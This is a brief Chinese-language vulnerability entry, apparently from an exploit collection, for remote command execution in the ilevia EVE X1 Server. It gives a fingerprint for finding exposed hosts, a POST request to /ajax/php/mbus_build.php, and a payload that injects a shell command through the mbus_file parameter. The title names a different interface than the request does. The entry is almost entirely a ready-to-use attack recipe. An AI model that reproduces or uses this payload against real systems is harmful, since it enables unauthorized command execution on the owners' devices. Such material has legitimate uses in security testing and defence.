# ileviaEVEX1Server接口get_history_data_odic存在远程命令执行漏洞

ileviaEVEX1Server ｜ 命令执行 ｜ —
- **指纹**：`app="ilevia-EVE-X1-Server"`
- **请求**：`POST /ajax/php/mbus_build.php HTTP/1.1`

**Payload**
```
mbus_interface=/dev/ttyUSB0&mbus_file=malicious_file.mbus"; id; #
```
- **响应特征**：200